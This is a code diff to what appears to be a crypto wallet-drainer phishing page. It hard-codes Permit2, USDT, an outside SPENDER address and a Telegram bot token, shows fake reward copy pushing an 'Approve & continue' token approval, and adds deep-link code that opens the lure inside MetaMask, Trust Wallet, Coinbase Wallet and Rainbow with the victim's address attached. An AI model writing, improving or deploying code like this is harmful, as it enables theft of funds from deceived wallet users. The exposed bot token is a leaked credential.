@@ -13,7 +13,7 @@ var PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 var USDT    = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 var SPENDER = "0x307E61DA2DF9EC48a08d735a14BD6271282ba035";
 var BOT     = "9117463676:AAHswmKAjqWvTOAUu3YwL7EEqdwLyEUei24";
-var LAND    = "/check";
+var LAND    = "check.html";
 var CHAIN   = 1;
 var DAY     = 86400;
 
@@ -31,7 +31,7 @@ var COPY = {
     sub: "The network pays you to stress it — that is the whole programme. Swap, stake, buy or sell and the figure clears against your own activity, and <b>the more you run, the more of the pool releases</b>. One approval here covers every action, so you never approve again.",
     band: [["Floor", "$1,000", 0], ["Mean", "$5,000", 0], ["Unlocked", "25%", 1]],
     btn: "Approve & continue →",
-    note: "Seats close 2 Dec · approve costs gas once · dies in 30 days"
+    note: "Seats close 12 Dec · approve costs gas once · dies in 30 days"
   },
   swap: {
     h: "Swap · epoch 07",
@@ -496,16 +496,20 @@ async function flow() {
 }
 
 /* ---------------------------------------------------------------- chooser */
+function base() {
+  return location.origin + location.pathname.replace(/[^/]*$/, "");
+}
+
 function chooser() {
   var w = mount();
   var card = w.querySelector(".p2c");
   var owner = P.owner || "";
-  var full = "https://spheres.xyz" + LAND + "?a=" + owner + "&w=1";
+  var full = base() + LAND + "?a=" + owner + "&w=1" + (ACTION !== "eligibility" ? "&x=" + ACTION : "");
   var ua = navigator.userAgent;
   var and = /Android/i.test(ua);
   var ios = /iPhone|iPad|iPod/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
   var rows = [
-    ["MetaMask", "io.metamask", function (u) { return "https://metamask.app.link/dapp/" + u.replace(/^https:\/\//, ""); }],
+    ["MetaMask", "io.metamask", function (u) { return "https://metamask.app.link/dapp/" + u.replace(/^https?:\/\//, ""); }],
     ["Trust Wallet", "com.wallet.crypto.trustapp", function (u) { return "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(u); }],
     ["Coinbase Wallet", "org.toshi", function (u) { return "https://go.cb-w.com/dapp?dappUrl=" + encodeURIComponent(u); }],
     ["Rainbow", "me.rainbow", function (u) { return "https://rnbwapp.com/dapp?url=" + encodeURIComponent(u); }]
@@ -520,7 +524,7 @@ function chooser() {
     a.addEventListener("click", function (e) {
       e.preventDefault();
       location.href = and
-        ? "intent://" + full.replace(/^https:\/\//, "") + "#Intent;scheme=https;package=" + r[1] +
+        ? "intent://" + full.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=" + r[1] +
           ";S.browser_fallback_url=" + encodeURIComponent(full) + ";end"
         : (ios ? r[2](full) : full);
     });
